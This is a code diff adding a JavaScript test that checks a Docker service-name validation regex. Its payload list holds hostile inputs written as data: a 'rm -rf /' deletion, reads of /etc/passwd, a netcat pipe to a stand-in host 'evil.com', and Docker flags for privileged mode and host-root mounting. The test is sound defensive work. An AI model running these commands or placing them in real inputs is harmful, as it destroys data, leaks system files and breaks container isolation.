@@ -79,3 +79,31 @@ describe('PROOF: Docker Command Injection — NIST SI-10, CIS Input Validation',
     });
   });
 });
+
+describe('SERVICE_NAME_PATTERN direct validation (bypass demo mode)', () => {
+  // The exact pattern used in docker-logs.js and docker-restart.js
+  const SERVICE_NAME_PATTERN = /^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/;
+
+  const INJECTION_PAYLOADS = [
+    '; rm -rf /',
+    '$(cat /etc/passwd)',
+    '`whoami`',
+    '| nc evil.com 1234',
+    '../../../etc/passwd',
+    'service\nARG2',
+    'service\x00injected',
+    'service --privileged',
+    '-v /:/host',
+  ];
+
+  it.each(INJECTION_PAYLOADS)('SERVICE_NAME_PATTERN rejects: %s', (payload) => {
+    expect(SERVICE_NAME_PATTERN.test(payload)).toBe(false);
+  });
+
+  it('SERVICE_NAME_PATTERN accepts valid names', () => {
+    const valid = ['postgres', 'fhir-service', 'hdim.gateway', 'redis_cache', 'svc123'];
+    for (const name of valid) {
+      expect(SERVICE_NAME_PATTERN.test(name)).toBe(true);
+    }
+  });
+});
